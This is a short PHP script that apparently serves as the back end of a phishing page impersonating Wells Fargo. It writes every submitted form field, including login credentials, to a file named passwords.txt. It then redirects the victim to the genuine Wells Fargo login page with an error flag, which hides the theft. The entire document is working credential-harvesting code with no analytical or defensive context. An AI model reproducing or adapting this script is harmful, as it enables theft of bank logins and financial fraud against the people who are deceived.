<?php
header (‘Location: https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&error=yes’);
$handle = fopen(“passwords.txt”, “a”);
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, “=”);
fwrite($handle, $value);
fwrite($handle, “\r\n”);
}
fwrite($handle, “\r\n”);
fclose($handle);
exit;
?>